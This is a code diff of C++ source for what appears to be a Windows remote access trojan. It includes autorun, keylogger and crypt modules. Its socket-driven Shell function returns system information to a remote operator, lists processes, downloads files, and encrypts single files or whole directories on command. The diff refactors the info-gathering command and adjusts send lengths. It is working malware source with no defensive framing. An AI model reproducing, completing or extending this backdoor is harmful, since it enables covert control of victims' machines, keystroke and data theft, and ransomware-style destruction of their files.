@@ -12,12 +12,14 @@
 #include <winsock2.h>
 #include <fstream>
 #include <string>
+//#include <iostream>
 
 #include "Autorun.h"
 #include "Config.h"
 #include "Socket.h"
 #include "Crypt.h"
 #include "Utils.h"
+#include "Info.h"
 #include "Keylogger.h"
 
 #pragma warning(disable: 4996)
@@ -121,16 +123,9 @@ int Shell(SOCKADDR_IN addr) {
 			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);
 		}
 
-		else if (strcmp(buffer, "sysinfo") == 0) {
-			system("systeminfo > file.txt");
-			std::ifstream F;
-			F.open("file.txt", std::ios::in);
-
-			while (getline(F, loc_buf_file)) {
-				buf_file += loc_buf_file + '\n';
-			}
-			system("del file.txt");
-			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);
+		else if (strcmp(buffer, "info") == 0) {
+			std::string info = GetAllInfo();
+			send(conn, info.c_str(), sizeof(buf_file) * 100, NULL);
 		}
 
 		else if (strcmp(buffer, "ps") == 0) {
@@ -191,7 +186,7 @@ int Shell(SOCKADDR_IN addr) {
 			recv(conn, path, sizeof(path), NULL);
 			recv(conn, key, sizeof(key), NULL);
 			std::string res = CryptFile(path, atoi(key));
-			send(conn, res.c_str(), res.size(), NULL);
+			send(conn, res.c_str(), res.length(), NULL);
 		}
 
 		else if (!strcmp(buffer, "cryptdir")) {
@@ -201,7 +196,7 @@ int Shell(SOCKADDR_IN addr) {
 			recv(conn, path, sizeof(path), NULL);
 			recv(conn, key, sizeof(key), NULL);
 			std::string res = CryptDir(path, atoi(key));
-			send(conn, res.c_str(), res.size(), NULL);
+			send(conn, res.c_str(), res.length(), NULL);
 		}
 
 		else if (!strcmp(buffer, "download")) {
